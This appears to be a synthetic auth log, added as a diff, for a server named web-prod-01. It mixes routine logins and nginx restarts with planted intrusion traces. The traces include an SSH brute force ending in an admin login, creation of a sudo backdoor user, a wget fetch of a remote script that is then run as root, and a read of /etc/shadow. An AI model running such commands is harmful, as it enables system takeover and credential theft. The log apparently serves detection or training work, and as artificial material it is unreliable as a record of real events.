@@ -1,0 +1,101 @@
+Sep 21 00:17:00 web-prod-01 CRON[9727]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 21 06:17:00 web-prod-01 CRON[19979]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 21 08:03:00 web-prod-01 sshd[15070]: Accepted publickey for liam from 192.0.2.22 port 63255 ssh2
+Sep 21 08:03:00 web-prod-01 sshd[3457]: pam_unix(sshd:session): session opened for user liam(uid=1001) by (uid=0)
+Sep 21 08:05:00 web-prod-01 sshd[4873]: Accepted publickey for deploy from 192.0.2.30 port 57821 ssh2
+Sep 21 08:05:00 web-prod-01 sshd[55188]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Sep 21 08:20:00 web-prod-01 sshd[26875]: Accepted publickey for priya from 192.0.2.21 port 39886 ssh2
+Sep 21 08:20:00 web-prod-01 sshd[43659]: pam_unix(sshd:session): session opened for user priya(uid=1001) by (uid=0)
+Sep 21 09:05:01 web-prod-01 sshd[37717]: Failed password for liam from 192.0.2.22 port 50216 ssh2
+Sep 21 09:05:20 web-prod-01 sshd[39115]: pam_unix(sshd:session): session opened for user liam(uid=1001) by (uid=0)
+Sep 21 09:05:20 web-prod-01 sshd[7753]: Accepted password for liam from 192.0.2.22 port 41844 ssh2
+Sep 21 09:35:00 web-prod-01 sudo[57260]:    deploy : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/apt update
+Sep 21 10:23:00 web-prod-01 sudo[39193]:    priya : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 21 12:17:00 web-prod-01 CRON[28468]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 21 12:40:00 web-prod-01 sudo[42119]:    deploy : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 21 15:03:00 web-prod-01 sudo[64979]:    deploy : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 21 15:04:00 web-prod-01 sudo[16772]:    liam : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/tail /var/log/nginx/error.log
+Sep 21 18:17:00 web-prod-01 CRON[10453]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 00:17:00 web-prod-01 CRON[23416]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 02:11:01 web-prod-01 sshd[47294]: Failed password for admin from 203.0.113.45 port 48246 ssh2
+Sep 22 02:11:10 web-prod-01 sshd[24512]: Failed password for admin from 203.0.113.45 port 57216 ssh2
+Sep 22 02:11:19 web-prod-01 sshd[63765]: Failed password for admin from 203.0.113.45 port 54932 ssh2
+Sep 22 02:11:28 web-prod-01 sshd[10890]: Failed password for admin from 203.0.113.45 port 45122 ssh2
+Sep 22 02:11:37 web-prod-01 sshd[12548]: Failed password for admin from 203.0.113.45 port 35438 ssh2
+Sep 22 02:11:46 web-prod-01 sshd[16201]: Failed password for admin from 203.0.113.45 port 39915 ssh2
+Sep 22 02:11:55 web-prod-01 sshd[1790]: Failed password for admin from 203.0.113.45 port 45291 ssh2
+Sep 22 02:12:04 web-prod-01 sshd[55466]: Failed password for admin from 203.0.113.45 port 61782 ssh2
+Sep 22 02:12:13 web-prod-01 sshd[18219]: Failed password for admin from 203.0.113.45 port 41950 ssh2
+Sep 22 02:12:22 web-prod-01 sshd[1268]: Failed password for admin from 203.0.113.45 port 48476 ssh2
+Sep 22 02:12:31 web-prod-01 sshd[28456]: Failed password for admin from 203.0.113.45 port 39547 ssh2
+Sep 22 02:12:40 web-prod-01 sshd[40964]: Failed password for admin from 203.0.113.45 port 54199 ssh2
+Sep 22 02:12:49 web-prod-01 sshd[63462]: Failed password for admin from 203.0.113.45 port 50880 ssh2
+Sep 22 02:12:58 web-prod-01 sshd[46252]: Failed password for admin from 203.0.113.45 port 38224 ssh2
+Sep 22 02:13:11 web-prod-01 sshd[41474]: pam_unix(sshd:session): session opened for user admin(uid=1001) by (uid=0)
+Sep 22 02:13:11 web-prod-01 sshd[63273]: Accepted password for admin from 203.0.113.45 port 63783 ssh2
+Sep 22 02:15:11 web-prod-01 sudo[43923]:    admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup
+Sep 22 02:15:12 web-prod-01 useradd[45315]: new user: name=svc-backup, UID=1005, GID=1005, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1
+Sep 22 02:16:11 web-prod-01 sudo[49482]:    admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup
+Sep 22 02:16:12 web-prod-01 usermod[4538]: add 'svc-backup' to group 'sudo'
+Sep 22 02:18:11 web-prod-01 sudo[30926]:    admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.99/x.sh -O /tmp/.x.sh
+Sep 22 02:19:11 web-prod-01 sudo[59951]:    admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/.x.sh
+Sep 22 02:21:11 web-prod-01 sudo[58080]:    admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Sep 22 06:17:00 web-prod-01 CRON[10960]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 08:15:00 web-prod-01 sshd[46809]: Accepted publickey for liam from 192.0.2.22 port 41781 ssh2
+Sep 22 08:15:00 web-prod-01 sshd[52106]: pam_unix(sshd:session): session opened for user liam(uid=1001) by (uid=0)
+Sep 22 08:21:00 web-prod-01 sshd[19870]: Accepted publickey for deploy from 192.0.2.30 port 59414 ssh2
+Sep 22 08:21:00 web-prod-01 sshd[40908]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Sep 22 08:36:00 web-prod-01 sshd[25405]: Accepted publickey for priya from 192.0.2.21 port 42312 ssh2
+Sep 22 08:36:00 web-prod-01 sshd[7385]: pam_unix(sshd:session): session opened for user priya(uid=1001) by (uid=0)
+Sep 22 09:05:01 web-prod-01 sshd[51106]: Failed password for liam from 192.0.2.22 port 35086 ssh2
+Sep 22 09:05:20 web-prod-01 sshd[23290]: Accepted password for liam from 192.0.2.22 port 50561 ssh2
+Sep 22 09:05:20 web-prod-01 sshd[46566]: pam_unix(sshd:session): session opened for user liam(uid=1001) by (uid=0)
+Sep 22 09:39:00 web-prod-01 sudo[14497]:    priya : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 22 12:17:00 web-prod-01 CRON[62162]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 22 13:33:00 web-prod-01 sudo[33447]:    liam : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 22 13:40:01 web-prod-01 sshd[27087]: Failed password for priya from 198.51.100.77 port 55714 ssh2
+Sep 22 13:40:51 web-prod-01 sshd[26829]: Failed password for liam from 198.51.100.77 port 56147 ssh2
+Sep 22 13:41:41 web-prod-01 sshd[32557]: Failed password for deploy from 198.51.100.77 port 36785 ssh2
+Sep 22 13:42:31 web-prod-01 sshd[5079]: Failed password for backup from 198.51.100.77 port 56243 ssh2
+Sep 22 13:43:21 web-prod-01 sshd[5413]: Failed password for ubuntu from 198.51.100.77 port 42491 ssh2
+Sep 22 13:44:11 web-prod-01 sshd[29876]: Failed password for admin from 198.51.100.77 port 43681 ssh2
+Sep 22 13:45:01 web-prod-01 sshd[8204]: Failed password for git from 198.51.100.77 port 40636 ssh2
+Sep 22 13:45:51 web-prod-01 sshd[40369]: Failed password for test from 198.51.100.77 port 52285 ssh2
+Sep 22 15:10:00 web-prod-01 sudo[50619]:    deploy : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 22 15:49:00 web-prod-01 sudo[21587]:    priya : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/tail /var/log/nginx/error.log
+Sep 22 16:23:00 web-prod-01 sudo[20645]:    priya : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/tail /var/log/nginx/error.log
+Sep 22 18:17:00 web-prod-01 CRON[33044]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 23 00:17:00 web-prod-01 CRON[33539]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 23 04:02:00 web-prod-01 sshd[7709]: Invalid user oracle from 203.0.113.200 port 33445
+Sep 23 04:02:01 web-prod-01 sshd[1015]: Failed password for invalid user oracle from 203.0.113.200 port 33445 ssh2
+Sep 23 04:02:30 web-prod-01 sshd[36167]: Invalid user postgres from 203.0.113.200 port 39913
+Sep 23 04:02:31 web-prod-01 sshd[7649]: Failed password for invalid user postgres from 203.0.113.200 port 39913 ssh2
+Sep 23 04:03:00 web-prod-01 sshd[41221]: Invalid user pi from 203.0.113.200 port 53829
+Sep 23 04:03:01 web-prod-01 sshd[2671]: Failed password for invalid user pi from 203.0.113.200 port 53829 ssh2
+Sep 23 04:03:30 web-prod-01 sshd[58300]: Invalid user user1 from 203.0.113.200 port 34608
+Sep 23 04:03:31 web-prod-01 sshd[14628]: Failed password for invalid user user1 from 203.0.113.200 port 34608 ssh2
+Sep 23 04:04:00 web-prod-01 sshd[10735]: Invalid user ftpuser from 203.0.113.200 port 54656
+Sep 23 04:04:01 web-prod-01 sshd[42576]: Failed password for invalid user ftpuser from 203.0.113.200 port 54656 ssh2
+Sep 23 06:17:00 web-prod-01 CRON[6280]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 23 08:13:00 web-prod-01 sshd[49389]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Sep 23 08:13:00 web-prod-01 sshd[9476]: Accepted publickey for deploy from 192.0.2.30 port 48837 ssh2
+Sep 23 08:19:00 web-prod-01 sshd[19651]: Accepted publickey for liam from 192.0.2.22 port 59205 ssh2
+Sep 23 08:19:00 web-prod-01 sshd[47964]: pam_unix(sshd:session): session opened for user liam(uid=1001) by (uid=0)
+Sep 23 08:22:00 web-prod-01 sshd[39004]: Accepted publickey for priya from 192.0.2.21 port 62550 ssh2
+Sep 23 08:22:00 web-prod-01 sshd[53225]: pam_unix(sshd:session): session opened for user priya(uid=1001) by (uid=0)
+Sep 23 09:05:01 web-prod-01 sshd[58893]: Failed password for liam from 192.0.2.22 port 48208 ssh2
+Sep 23 09:05:20 web-prod-01 sshd[29214]: pam_unix(sshd:session): session opened for user liam(uid=1001) by (uid=0)
+Sep 23 09:05:20 web-prod-01 sshd[54692]: Accepted password for liam from 192.0.2.22 port 38973 ssh2
+Sep 23 09:29:00 web-prod-01 sudo[24295]:    liam : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Sep 23 09:46:00 web-prod-01 sudo[46972]:    priya : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 23 10:17:00 web-prod-01 sudo[32070]:    priya : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 23 10:31:00 web-prod-01 sudo[4863]:    liam : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/apt update
+Sep 23 12:17:00 web-prod-01 CRON[11902]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 23 15:30:00 web-prod-01 sudo[40470]: pam_unix(sudo:auth): authentication failure; logname=intern uid=1010 euid=0 tty=/dev/pts/2 ruser=intern rhost=  user=intern
+Sep 23 15:30:20 web-prod-01 sudo[24865]: pam_unix(sudo:auth): authentication failure; logname=intern uid=1010 euid=0 tty=/dev/pts/2 ruser=intern rhost=  user=intern
+Sep 23 15:30:40 web-prod-01 sudo[32073]: pam_unix(sudo:auth): authentication failure; logname=intern uid=1010 euid=0 tty=/dev/pts/2 ruser=intern rhost=  user=intern
+Sep 23 15:31:00 web-prod-01 sudo[9050]: pam_unix(sudo:auth): authentication failure; logname=intern uid=1010 euid=0 tty=/dev/pts/2 ruser=intern rhost=  user=intern
+Sep 23 15:58:00 web-prod-01 sudo[58109]:    deploy : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/tail /var/log/nginx/error.log
+Sep 23 18:17:00 web-prod-01 CRON[30437]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 23 22:48:00 web-prod-01 sshd[23766]: pam_unix(sshd:session): session opened for user root(uid=1001) by (uid=0)
+Sep 23 22:48:00 web-prod-01 sshd[63617]: Accepted password for root from 192.0.2.99 port 46531 ssh2
